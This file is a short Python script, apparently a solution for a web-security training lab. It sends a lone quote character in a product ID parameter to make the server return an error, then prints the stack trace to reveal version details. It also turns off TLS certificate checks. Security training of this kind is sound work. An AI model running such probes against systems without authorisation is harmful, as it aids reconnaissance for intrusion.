import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def output_version_number(s, url):
    product_url = url + "/product?productId='"
    r = s.get(product_url, verify=False, proxies=proxies)
    res = r.text
    if (r.status_code == 500):
        print("(+) Successfully exploited vulnerability!")
        print("(+) The following is the stack trace: ")
        print(res)
    else:
        print("(-) Could not exploit vulnerabilty.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    output_version_number(s, url)

if __name__ == "__main__":
    main()